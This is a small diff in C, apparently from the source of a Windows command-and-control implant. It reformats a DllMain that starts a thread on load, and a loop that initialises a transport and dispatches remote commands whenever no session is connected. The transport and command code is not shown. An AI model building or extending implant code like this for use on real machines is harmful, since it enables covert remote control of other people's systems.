@@ -31,8 +31,11 @@ INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
 __declspec(dllexport) void run();
 
 BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved){
-    switch (ul_reason_for_call)  {
+
+    switch (ul_reason_for_call){
+
         case DLL_PROCESS_ATTACH:
+
             RvntInit();
 
             CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) run, NULL, 0, NULL);
@@ -49,8 +52,11 @@ BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpRese
 __declspec(dllexport) void run(){
 
     do {
+
         if (!Instance.Session.Connected) {
+
             if (TransportInit()) {
+
                 CommandDispatcher();
             }
         }
